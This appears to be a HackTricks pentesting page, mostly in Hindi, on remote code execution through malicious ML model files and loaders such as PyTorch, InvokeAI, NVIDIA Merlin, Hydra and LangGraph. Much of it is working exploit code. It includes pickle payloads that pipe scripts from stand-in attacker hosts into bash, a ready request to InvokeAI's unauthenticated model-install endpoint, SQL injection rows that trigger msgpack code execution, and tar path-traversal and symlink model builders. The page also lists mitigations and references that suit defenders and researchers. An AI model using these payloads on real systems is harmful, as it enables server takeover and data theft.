# Models RCE

{{#include ../banners/hacktricks-training.md}}

## RCE के लिए models लोड करना

Machine Learning models आमतौर पर ONNX, TensorFlow, PyTorch आदि जैसे अलग-अलग formats में साझा किए जाते हैं। Developers इन्हें अपनी machines या production systems में इस्तेमाल करने के लिए लोड कर सकते हैं। आमतौर पर models में malicious code नहीं होना चाहिए, लेकिन कुछ मामलों में model को system पर arbitrary code execute करने के लिए इस्तेमाल किया जा सकता है—या तो intended feature के रूप में, या model-loading library की किसी vulnerability के कारण।

नीचे दी गई table इस category की कुछ प्रतिनिधि vulnerabilities सूचीबद्ध करती है:

| **Framework / Tool**        | **Vulnerability (उपलब्ध होने पर CVE)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load` में insecure deserialization* **(CVE-2025-32434)**                                                              | Model checkpoint में malicious pickle से code execution होता है (`weights_only` safeguard को bypass करके)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download से code execution होता है; management API में Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` के ज़रिए unsafe checkpoint deserialization **(CVE-2025-23298)**                                           | Untrusted checkpoint, `load_model_trainer_states_from_checkpoint` के दौरान pickle reducer trigger करता है → ML worker में code execution            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key से SQL/JSON-path syntax inject होता है, `UNION SELECT` एक fake checkpoint row बनाता है, फिर `msgpack` deserialization attacker द्वारा चुने गए Python code को import करके call करता है | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML से model लोड करने पर `yaml.unsafe_load` का उपयोग होता है (code exec) <br> **Lambda** layer वाला model लोड करने पर arbitrary Python code चलता है          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model integer overflow trigger करता है → heap corruption (संभावित RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` के ज़रिए model लोड करने पर attacker के `__reduce__` payload वाला pickle execute होता है                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *विवादित*                                                                              | `numpy.load` के default व्यवहार से pickled object arrays की अनुमति थी – malicious `.npy/.npz` से code exec trigger होता है                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model का external-weights path directory से बाहर जा सकता है (arbitrary files पढ़ना) <br> Malicious ONNX model tar arbitrary files overwrite कर सकता है (जिससे RCE हो सकता है) | |
| ONNX Runtime (design risk)  | *(कोई CVE नहीं)* ONNX custom ops / control flow                                                                                    | Custom operator वाले model को attacker का native code लोड करना पड़ता है; complex model graphs logic का दुरुपयोग करके अनपेक्षित computations execute करते हैं   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` enabled होने पर model-load API का उपयोग relative path traversal से files लिखने की अनुमति देता है (उदाहरण के लिए, RCE के लिए `.bashrc` overwrite करना)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (कई heap overflows)                                                                         | Malformed GGUF model file parser में heap buffer overflows उत्पन्न करती है, जिससे victim system पर arbitrary code execution संभव होता है                     | |
| **Keras (पुराने formats)**   | *(कोई नया CVE नहीं)* Legacy Keras H5 model                                                                                         | Lambda layer वाला malicious HDF5 (`.h5`) model लोड होने पर code execute करता है (Keras safe_mode पुराने format को कवर नहीं करता – “downgrade attack”) | |
| **अन्य** (सामान्य)        | *Design flaw* – Pickle serialization                                                                                         | कई ML tools (उदाहरण के लिए, pickle-based model formats और Python `pickle.load`) mitigation न होने पर model files में embedded arbitrary code execute करेंगे | |
| **NeMo / uni2TS / FlexTok (Hydra)** | `hydra.utils.instantiate()` को दिया गया untrusted metadata **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config, `_target_` को किसी arbitrary callable (जैसे `builtins.exec`) पर set करता है → “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) इस्तेमाल करने पर भी load के दौरान execute होता है | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

इसके अलावा, कुछ Python pickle-based models—जैसे [PyTorch](https://github.com/pytorch/pytorch/security) द्वारा इस्तेमाल किए जाने वाले models—को `weights_only=True` के बिना लोड करने पर system पर arbitrary code execute करने के लिए इस्तेमाल किया जा सकता है। इसलिए, कोई भी pickle-based model इस प्रकार के attacks के प्रति विशेष रूप से susceptible हो सकता है, भले ही वह ऊपर दी गई table में सूचीबद्ध न हो।

### Hydra metadata → RCE (safetensors के साथ भी काम करता है)

`hydra.utils.instantiate()` किसी configuration/metadata object में दिए गए dotted `_target_` को import करके call करता है। जब Hugging Face Transformers जैसी libraries **untrusted model metadata** को `instantiate()` में भेजती हैं, तो attacker ऐसा callable और arguments दे सकता है जो model load होते ही execute हो जाएँ (pickle की ज़रूरत नहीं)।<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload का उदाहरण (`.nemo` `model_config.yaml`, repo `config.json`, या `.safetensors` के अंदर `__metadata__` में काम करता है):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

मुख्य बिंदु:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders और FlexTok loaders में model initialization से पहले trigger होता है।
- Hydra की string block-list को वैकल्पिक import paths (जैसे `enum.bltns.eval`) या application-resolved names (जैसे `nemo.core.classes.common.os.system` → `posix`) के जरिए bypass किया जा सकता है।<sup>[[14]](#references)</sup>
- FlexTok, Hydra call से पहले `ast.literal_eval` के साथ stringified metadata को भी parse करता है, जिससे DoS (CPU/memory blowup) हो सकता है।

### 🆕  InvokeAI में `torch.load` के जरिए RCE (CVE-2024-12029)

`InvokeAI`, Stable-Diffusion के लिए एक लोकप्रिय open-source web interface है। **5.3.1 – 5.4.2** versions में REST endpoint `/api/v2/models/install` उपलब्ध है, जो users को arbitrary URLs से models download और load करने देता है।<sup>[[1]](#references)</sup>

आंतरिक रूप से, यह endpoint अंततः यह call करता है:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

जब दी गई फ़ाइल **PyTorch checkpoint (`*.ckpt`)** होती है, तो `torch.load` **pickle deserialization** करता है। चूँकि सामग्री सीधे उपयोगकर्ता-नियंत्रित URL से आती है, इसलिए attacker checkpoint के अंदर custom `__reduce__` method वाला malicious object एम्बेड कर सकता है; यह method **deserialization के दौरान** execute होता है, जिससे InvokeAI server पर **remote code execution (RCE)** हो सकता है।

इस vulnerability को **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %) दिया गया था।

#### Exploitation का चरण-दर-चरण विवरण

1. एक malicious checkpoint बनाएँ:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt` को अपने नियंत्रण वाले HTTP server पर होस्ट करें (उदा. `http://ATTACKER/payload.ckpt`)।
3. Vulnerable endpoint को ट्रिगर करें (authentication की आवश्यकता नहीं):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. जब InvokeAI फ़ाइल डाउनलोड करता है, तो यह `torch.load()` को कॉल करता है → `os.system` gadget चलता है और हमलावर को InvokeAI process के context में code execution मिल जाता है।

तैयार exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` पूरे flow को automate करता है।<sup>[[3]](#references)</sup>

#### शर्तें

•  InvokeAI 5.3.1-5.4.2 (scan flag का default **false** है)
•  `/api/v2/models/install` हमलावर के लिए accessible हो
•  Process के पास shell commands execute करने की permissions हों

#### Mitigations

* **InvokeAI ≥ 5.4.3** पर upgrade करें – patch default रूप से `scan=True` सेट करता है और deserialization से पहले malware scanning करता है।<sup>[[2]](#references)</sup>
* Checkpoints को programmatically load करते समय `torch.load(file, weights_only=True)` या नए [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper का उपयोग करें।
* Model sources के लिए allow-lists / signatures लागू करें और service को least-privilege के साथ चलाएँ।

> ⚠️ याद रखें कि कोई भी Python pickle-based format (जिसमें कई `.pt`, `.pkl`, `.ckpt`, `.pth` files शामिल हैं) untrusted sources से deserialize करना स्वाभाविक रूप से unsafe है।

---

अगर आपको पुराने InvokeAI versions को reverse proxy के पीछे चलाना ही हो, तो ad-hoc mitigation का एक उदाहरण:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec के ज़रिए RCE: असुरक्षित `torch.load` (CVE-2025-23298)

NVIDIA के Transformers4Rec (Merlin का हिस्सा) में एक असुरक्षित checkpoint loader था, जो उपयोगकर्ता द्वारा दिए गए paths पर सीधे `torch.load()` कॉल करता था। चूँकि `torch.load` Python `pickle` पर निर्भर करता है, इसलिए attacker के नियंत्रण वाला checkpoint deserialization के दौरान reducer के ज़रिए मनमाना code execute कर सकता है।<sup>[[5]](#references)</sup>

कमज़ोर path (fix से पहले): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`।

इससे RCE क्यों होता है: Python pickle में कोई object एक reducer (`__reduce__`/`__setstate__`) परिभाषित कर सकता है, जो एक callable और arguments लौटाता है। Unpickling के दौरान callable execute होता है। अगर checkpoint में ऐसा object मौजूद हो, तो यह किसी भी weights के इस्तेमाल से पहले execute हो जाता है।

न्यूनतम malicious checkpoint का उदाहरण:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

डिलीवरी वेक्टर और प्रभाव का दायरा:
- repos, buckets या artifact registries के ज़रिए साझा किए गए Trojanized checkpoints/models
- Automated resume/deploy pipelines, जो checkpoints को अपने-आप load करती हैं
- Execution training/inference workers के अंदर होता है, अक्सर elevated privileges के साथ (जैसे, containers में root)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ने सीधे `torch.load()` के इस्तेमाल को हटाकर `transformers4rec/utils/serialization.py` में लागू restricted, allow-listed deserializer का उपयोग किया। नया loader types/fields को validate करता है और load के दौरान मनमाने callables को invoke होने से रोकता है।<sup>[[7]](#references)</sup>

PyTorch checkpoints के लिए विशिष्ट रक्षात्मक मार्गदर्शन:
- Untrusted data को unpickle न करें। संभव हो तो Safetensors](https://huggingface.co/docs/safetensors/index) या ONNX जैसे non-executable formats को प्राथमिकता दें।
- यदि PyTorch serialization का उपयोग करना ज़रूरी हो, तो सुनिश्चित करें कि `weights_only=True` हो (नए PyTorch में supported) या Transformers4Rec patch जैसा custom allow-listed unpickler उपयोग करें।<sup>[[4]](#references)</sup>
- Model provenance/signatures लागू करें और deserialization को sandbox में चलाएँ (seccomp/AppArmor; non-root user; restricted FS और कोई network egress नहीं)।
- Checkpoint load होने के समय ML services से शुरू होने वाली अप्रत्याशित child processes पर नज़र रखें; `torch.load()`/`pickle` के उपयोग को trace करें।

POC और vulnerable/patch संदर्भ:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Patch से पहले का vulnerable loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Patch के बाद का loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## उदाहरण – malicious PyTorch model बनाना

- Model बनाएँ:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- मॉडल लोड करें:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent का FaceDetection-DSFD एक `resnet` endpoint उपलब्ध कराता है, जो user-controlled data को deserialize करता है। ZDI ने पुष्टि की कि remote attacker किसी victim से malicious page/file लोड करवा सकता है, उससे उस endpoint पर crafted serialized blob भेजवा सकता है और `root` के रूप में deserialization trigger कर सकता है, जिससे सिस्टम पूरी तरह compromise हो जाता है।

Exploit flow, pickle के सामान्य दुरुपयोग जैसा है:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

डिसेरियलाइज़ेशन के दौरान पहुँच में आने वाले किसी भी gadget (constructors, `__setstate__`, framework callbacks आदि) को इसी तरह weaponize किया जा सकता है—चाहे transport HTTP हो, WebSocket हो या किसी watched directory में डाली गई फ़ाइल।

### LangGraph checkpointer SQLi → MessagePack RCE

यह attack chain दिलचस्प है, क्योंकि attacker को **malicious model file upload करने की ज़रूरत नहीं होती**। इसके बजाय, application एक **AI-agent persistence API** (`get_state_history(..., filter=...)`) उपलब्ध कराता है और user input checkpointer query builder तक पहुँचता है।

#### 1. metadata filters में Structural SQLi

एक vulnerable SQLite pattern कुछ इस तरह दिखता था:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

मान बाद में bind किया जाता है, लेकिन `query_key` को **JSON path string** में concatenate किया जाता है, इसलिए dictionary key में मौजूद `'` `'$.{query_key}'` से बाहर निकलकर SQL inject करता है। यही सीख **JSON paths, identifiers, operators, `LIMIT`, और TTL fields** पर भी लागू होती है: placeholders केवल values को सुरक्षित रखते हैं, query की संरचनात्मक syntax को नहीं।

#### 2. `UNION SELECT` downstream sinks को target कर सकता है, सिर्फ़ data चोरी को नहीं

Query `type` और serialized `checkpoint` bytes लौटाती है, जिन्हें बाद में इस तरह consume किया जाता है:

```python
self.serde.loads_typed((type, checkpoint))
```

इसका मतलब है कि `WHERE` clause में SQLi एक **fake result row** inject कर सकता है:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

यदि बाद का code किसी चुने गए column को parse, deserialize, write या execute करता है, तो उन columns को उनके sinks से map करें। इस मामले में fake row, SQLi को **attacker-controlled deserialization** में बदल देती है।

#### 3. Unsafe MessagePack extension hooks, code gadgets के बराबर हैं

LangGraph के `msgpack` path में एक custom extension hook का उपयोग किया गया था, जो एक nested tuple को unpack करके यह execute करता था:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

तो `("os", "system", "id > /tmp/pwned")` के समतुल्य किसी चीज़ को encode करने वाला MessagePack extension object, `os` को import करता है, `system` को resolve करता है और command चलाता है। AI frameworks की समीक्षा करते समय, **custom MessagePack/JSON/pickle revivers** में dynamic imports, reflection या मनमाने callable dispatch की जाँच करें।

#### 4. Agent frameworks के लिए व्यावहारिक audit pattern

किसी भी ऐसे user-controlled input की समीक्षा करें जो इन तक पहुँचता हो:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders, जो SQL या Redis query fragments बनाते हैं
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths, जो persistence layer से लौटाई गई rows पर भरोसा करते हैं

यह विशिष्ट chain, self-hosted LangGraph deployments को प्रभावित करती थी, जो **SQLite** या **Redis** checkpointers इस्तेमाल करते थे और जिनमें untrusted users `filter` को नियंत्रित कर सकते थे। Disclosure में बताए गए patched versions थे: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, और `langgraph-checkpoint 4.0.1+`।<sup>[[15]](#references)</sup>

## Models से Path Traversal

[**इस blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) में बताया गया है कि अलग-अलग AI frameworks द्वारा इस्तेमाल किए जाने वाले अधिकांश model formats archives पर आधारित होते हैं, आमतौर पर `.zip`। इसलिए, इन formats का दुरुपयोग करके path traversal attacks करना संभव हो सकता है, जिससे उस system की मनमानी files पढ़ी जा सकती हैं जहाँ model load किया जाता है।<sup>[[16]](#references)</sup>

उदाहरण के लिए, नीचे दिए गए code से आप ऐसा model बना सकते हैं जो load होने पर `/tmp` directory में एक file बनाएगा:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

या, निम्नलिखित कोड से आप ऐसा मॉडल बना सकते हैं जो लोड होने पर `/tmp` डायरेक्टरी के लिए symlink बनाएगा:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### गहन विश्लेषण: Keras .keras deserialization और gadget hunting

.keras internals, Lambda-layer RCE, ≤ 3.8 में arbitrary import issue और allowlist के भीतर post-fix gadget discovery पर केंद्रित मार्गदर्शिका के लिए देखें:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – InvokeAI में अविश्वसनीय डेटा का deserialization"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit module के दस्तावेज़](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load के लिए सुरक्षा संबंधी विचार](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI blog – CVE-2025-23298 NVIDIA Merlin में Remote Code Execution हासिल करना](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Patch से पहले का vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Patch के बाद का loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – आधुनिक AI/ML formats और libraries के ज़रिए Remote Code Execution](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra block-list commit (RCE के बारे में चेतावनी)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – SQLi से RCE तक: LangGraph के Checkpointer का शोषण](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive Slip bugs को उच्च-मूल्य वाले AI/ML bounties में बदलना](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
{{#include ../banners/hacktricks-training.md}}
